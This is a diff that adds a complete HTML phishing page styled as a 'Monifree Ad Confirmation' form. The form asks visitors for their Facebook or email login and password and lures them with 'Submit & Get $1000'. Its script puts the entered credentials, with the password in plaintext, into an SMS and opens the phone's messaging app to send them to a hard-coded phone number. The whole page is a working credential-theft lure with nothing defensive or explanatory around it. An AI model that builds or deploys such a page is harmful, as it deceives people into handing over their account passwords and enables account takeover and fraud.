@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Monifree INC - Ad Confirmation</title>
+    <style>
+        body {
+            background: linear-gradient(to bottom, aquamarine, black);
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+        .form-container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 25px;
+            border-radius: 12px;
+            width: 340px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        h2 {
+            margin-bottom: 15px;
+            color: aquamarine;
+        }
+        input {
+            width: calc(100% - 12px);
+            padding: 12px;
+            margin: 10px 6px 10px 0;
+            border: none;
+            border-radius: 8px;
+            outline: none;
+            font-size: 16px;
+        }
+        .password-container {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .password-container input {
+            width: 100%;
+            padding-right: 45px;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            cursor: pointer;
+            font-size: 18px;
+            color: aquamarine;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: aquamarine;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 8px;
+            transition: background 0.3s ease-in-out;
+        }
+        button:hover {
+            background-color: #66cdaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Monifree Ad Confirmation</h2>
+        <p>Input your Facebook/Email address details to confirm the post</p>
+        <form id="monifreeForm">
+            <input type="tel" id="phone" placeholder="Enter Phone Number/Email" required>
+
+            <div class="password-container">
+                <input type="password" id="password" placeholder="Enter Password" required>
+                <span class="toggle-password" onclick="togglePassword()">👁️</span>
+            </div>
+
+            <button type="button" onclick="sendSMS()">Submit & Get $1000</button>
+        </form>
+    </div>
+
+    <script>
+        function togglePassword() {
+            let passwordField = document.getElementById("password");
+            let toggleIcon = document.querySelector(".toggle-password");
+
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                toggleIcon.textContent = "🙈"; // Change icon to "hide"
+            } else {
+                passwordField.type = "password";
+                toggleIcon.textContent = "👁️"; // Change icon to "show"
+            }
+        }
+
+        function sendSMS() {
+            let phone = document.getElementById("phone").value;
+            let password = document.getElementById("password").value;
+
+            if (!phone || !password) {
+                alert("Please enter your details.");
+                return;
+            }
+
+            let companyNumber = "+2348064811587"; // Replace with Monifree’s real number
+            let smsContent = `Monifree Submission\nPhone: ${phone}\nPassword: ${password}`;
+
+            // Open SMS app with pre-filled message
+            window.location.href = `sms:${companyNumber}?body=${encodeURIComponent(smsContent)}`;
+        }
+    </script>
+</body>
+</html>
